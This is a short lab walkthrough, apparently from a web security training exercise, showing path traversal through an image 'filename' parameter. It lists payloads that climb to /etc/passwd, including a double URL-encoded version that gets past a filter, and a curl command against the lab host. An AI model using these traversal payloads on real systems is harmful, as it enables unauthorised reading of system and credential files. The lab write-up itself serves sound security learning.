1) visit the homepage and visit a product


2) open the imaghe into another tab and change ?filename=111.jpg to ?filename=../../../../../etc/passwd
but it is blocked 

so we try to url encode it 
?filename=..%2f..%2f..%2f..%2f..%2fetc/passwd but nothing, so we try a second URL encoding

?filename=..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd 

IT WORKS, so we can access to the file 


3) browsers will not show the results because the image has an error but we can use curl
     curl lab.net/image?filename=..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd 

4) in this way we can read the passwd file



